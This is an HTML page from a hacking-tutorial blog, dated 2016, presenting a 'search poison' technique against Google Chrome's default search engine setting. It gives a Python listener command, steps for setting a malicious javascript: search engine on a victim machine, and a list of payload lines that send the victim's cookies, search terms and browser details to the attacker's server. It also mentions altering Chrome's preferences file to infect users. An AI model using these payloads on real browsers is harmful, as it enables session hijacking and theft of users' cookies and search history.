<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-type" content="text/html;charset=UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="stylesheet" href="main.css" type="text/css" />
<link rel="stylesheet" href="blog.css" type="text/css" />
<link rel="alternate" type="application/rss+xml" title="Subscribe to this page..." href="feed.rss" />
<title>Google Chrome Search Poison – Default Search Engine Exploit</title>
</head><body>
<div id="divbodyholder">
<div class="headerholder"><div class="header">
<div id="title">
<h1 class="nomargin"><a class="ablack" href="https://metalkey.net/index.html">m3t4lk3y</a></h1>
<div id="description">Hacking tutorials + info</div>
</div></div></div>
<div id="divbody"><div class="content">
<!-- entry begin -->
<h3><a class="ablack" href="google-chrome-search-poison---default-search-engine-exploit.html">
Google Chrome Search Poison – Default Search Engine Exploit
</a></h3>
<!-- bashblog_timestamp: #201607021941.50# -->
<div class="subtitle">July 02, 2016 &mdash; 
metalkey
</div>
<!-- text begin -->

<h2>Introduction</h2>

<p>In December 2015, I discovered a vulnerability in Google Chrome's (Chromium included) default search engines feature, whereby a lack of input sanitation allows an attacker to store XSS in the victim's browser.<br>
In this walkthrough we'll set up a Python SimpleHTTPServer and intercept the victim’s Cookies and search keywords.</p>

<h2>Video Demo</h2>

<p><a href="https://www.youtube.com/watch?v=WoF-LkA6fMk">https://www.youtube.com/watch?v=WoF-LkA6fMk</a><br>
The video demonstration involves manipulation of the chrome master-preferences file to infect the user with the malicious search engine. The user is then directed to the attackers apache server, which extracts the search query, cookies and other system information and seamlessly directs them back to their search.</p>

<h2>Setting up the Listener in Kali</h2>

<p><code></p>

<div class="code">
root@kali:~$ <com>python -m SimpleHTTPServer 80</com>
</div>

<p></code></p>

<h2>Setup on Victim Machine</h2>

<ol>
<li>Go into <strong>"Settings"</strong> in Google Chrome<br></li>
<li>Click on <strong>"Manage Search Engines"</strong><br></li>
<li>Enter your malicious JS and click <strong>"Make Default"</strong><br>
<br>
<h2>Example</h2></li>
</ol>

<p><code></p>

<div class="code">
<com>javascript:window.location='http://192.168.1.182/%s'+escape(document.cookie);</com>
</div>

<p></code>
Note: 192.168.1.182 is our SimpleHTTPServer.<br>
Now whenever the victim searches using Google Chrome’s Omnibox, the malicious JS will trigger, forwarding you their cookie and search string (%s).<br></p>

<h2>Other examples</h2>

<p><code></p>

<div class="code">
javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.cookie);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.baseURI);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.domain);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.URL);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(location.host);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.appCodeName);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.appName);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.appVersion);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.platform);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.userAgent);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.platform);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.product);
</div>

<p></code></p>

<p>Tags: <a href='tag_search-poison.html'>search-poison</a></p>
<!-- text end -->
<!-- entry end -->
</div>
<div id="footer">CC by-nc-nd <a href="https://twitter.com/m3t4lk3y">metalkey</a> &mdash; <a href="mailto:"></a><br/>
Generated with <a href="https://github.com/cfenollosa/bashblog">bashblog</a>, a single bash script to easily create blogs like this one</div>
</div></div>
</body></html>
